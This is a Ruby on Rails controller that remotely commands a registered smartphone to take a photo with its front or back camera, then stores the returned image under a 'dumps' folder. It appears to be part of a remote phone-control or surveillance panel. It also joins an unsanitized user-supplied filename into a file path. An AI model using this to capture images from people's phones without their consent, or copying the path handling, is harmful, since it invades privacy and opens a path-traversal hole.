class PicturesController < InheritedResources::Base
  include CommandSender
  
  def take_picture
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      currentTime = DateTime.now
      currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
      fileName = params[:filename].to_s
      camera = params[:back_camera] == "true" ? "0" : "1" # 0=back, 1=front
      @fileName = fileName.empty? ? "webcam_snap_#{currentTimeFormat}.jpeg" : "#{fileName}.jpeg"
      
      # Send take_photo command via ActionCable
      pending_command = send_command_and_wait(
        @smartphone, 
        'take_photo', 
        { camera_id: camera }, 
        timeout: 30.seconds
      )
      
      if pending_command.completed?
        photo_data = pending_command.response_data
        
        if photo_data['image_base64'].present?
          # Decode Base64 and save to file
          image_bytes = Base64.decode64(photo_data['image_base64'])
          file_path = Rails.root.join('files', 'dumps', 'pictures', @fileName)
          FileUtils.mkdir_p(File.dirname(file_path))
          File.binwrite(file_path, image_bytes)
          
          # Save to database
          Picture.create!(
            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
            filename: @fileName,
            smartphone_id: @smartphone.id
          )
          
          commandOutput = ["Photo captured successfully: #{@fileName} (#{photo_data['size']} bytes)"]
        else
          commandOutput = ["Operation Failed: No image data received"]
        end
      else
        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
        commandOutput = ["Operation Failed: #{error_msg}"]
      end
      
    rescue => e
      Rails.logger.error("Error taking picture: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "take_picture", locals: { commandOutput: commandOutput, fileName: @fileName }
      }
    end
  end

  private

  def picture_params
    params.require(:picture).permit(:date,
                                    :duration,
                                    :filename,
                                    :smartphone_id)
  end
end
